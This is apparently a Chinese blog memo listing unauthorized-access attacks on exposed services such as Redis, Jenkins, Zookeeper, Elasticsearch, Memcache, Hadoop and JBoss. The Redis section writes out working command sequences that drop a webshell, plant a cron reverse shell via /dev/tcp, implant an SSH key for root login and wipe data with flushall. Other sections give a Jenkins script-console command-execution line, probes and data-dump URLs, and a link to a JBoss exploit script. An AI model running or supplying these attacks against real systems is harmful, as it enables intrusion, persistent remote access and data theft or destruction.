未授权访问杂记

  • 技术学习

前言

看了一些常见的未授权访问汇总，自己也做个备忘。

正文

  1. Redis未授权(root权限):
    (1)、网站绝对路径写shell

    config get dir
    config set dir /var/www/html/
    config set dbfilename webshell.php
    SET webshell ““
    save

    (2)、计划任务反弹shell-linux

    set shell “\n* * * * * /bin/bash -i>& /dev/tcp/ip/port 0>&1\n”
    config set dir /var/spool/cron
    config set dbfilename root
    save

    (3)、写入SSH公钥

    $ ssh-keygen -t rsa
    $ (echo -e “\n\n”; cat /root/.ssh/id_rsa.pub; echo -e “\n\n”) > 1.txt
    $ cat 1.txt | redis-cli -h IP -x set crack
    $ redis-cli -h IP
    config set dir /root/.ssh
    config set dbfilename authorized_keys
    save
    $ ssh -i /root/.ssh/id_rsa root@IP
    清空数据库：flushall

  2. Jenkins:

    默认为8080端口
    http://localhost:8080/jenkins/manage
    http://localhost:8080/jenkins/script
    使用脚本命令行：println “ipconfig /all”.execute().text执行命令

  3. Mongodb:

    默认端口28017，使用图形化数据库连接工具连接

  4. Zookeeper:

    默认端口2181 使用zookeeper客户端
    echo envi|nc localhost 2181
    ./zkCli.sh -server ip:port
    ls / #查看所有节点信息
    get / #获取某个节点信息

  5. Elasticsearch

    默认端口9200
    http://localhost:9200/_plugin/head/ web管理界面
    http://localhost:9200/_cat/indices
    http://localhost:9200/_river/_search 查看数据库敏感信息
    http://localhost:9200/_nodes 查看节点数据

  6. Memcache

    默认端口11211 nc -vv IP 11211 连接成功漏洞存在

  7. Hadoop
    (1)、HDFS

    NameNode 默认端口 50070
    DataNode 默认端口 50075
    httpfs 默认端口 14000
    journalnode 默认端口 8480

    (2)、YARN（JobTracker）

    ResourceManager 默认端口 8088
    JobTracker 默认端口 50030
    TaskTracker 默认端口 50060

    (3)、Hue

    默认端口 8080

    (4)、YARN（JobTracker）

    master 默认端口 60010
    regionserver 默认端口 60030

    (5)、hive-server2

    默认端口 10000

    (6)、spark-jdbcserver

    默认端口 10003

  8. couchdb

    默认端口5984

  9. Idap

    使用Idap admin工具连接

  10. Jboss未授权访问

    进入管理界面远程部署war包getshell jmx console
    https://github.com/joaomatosf/jexboss 漏洞利用脚本
